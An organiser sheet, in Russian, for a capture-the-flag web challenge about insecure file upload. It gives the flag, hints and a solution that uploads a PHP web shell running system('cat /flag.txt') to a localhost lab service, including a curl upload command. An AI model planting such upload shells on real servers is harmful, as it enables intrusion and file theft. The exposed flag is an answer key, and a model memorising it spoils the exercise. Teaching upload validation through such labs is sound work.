# Challenge 10: File Upload

## Информация для организатора

| Параметр | Значение |
|----------|----------|
| **Название** | Загрузчик файлов |
| **Категория** | Web |
| **Сложность** | Medium |
| **Очки** | 200 |
| **Флаг** | `TATARHACK{f1l3_upl04d_1s_d4ng3r0us}` |
| **Порт** | 5004 |

## Описание для участников

> Мы создали сервис для загрузки изображений. 
> Правда, он проверяет только расширение файла...
> 
> http://localhost:5004
>
> Флаг находится в файле `/flag.txt` на сервере

## Подсказки

1. Какие файлы сервер может выполнять?
2. Попробуй загрузить файл с расширением .php
3. PHP-код: `<?php system('cat /flag.txt'); ?>`

## Способ решения

1. Создать файл `shell.php`:
```php
<?php
echo system('cat /flag.txt');
?>
```

2. Загрузить файл через форму
3. Перейти по ссылке на загруженный файл
4. Получить флаг!

### Альтернативный способ

```bash
curl -F "file=@shell.php" http://localhost:5004/upload
# Затем открыть http://localhost:5004/uploads/shell.php
```

## Образовательная цель

Показать опасность произвольной загрузки файлов.
Объяснить, что проверка только расширения — недостаточна.
Рассказать о правильной валидации загружаемых файлов.
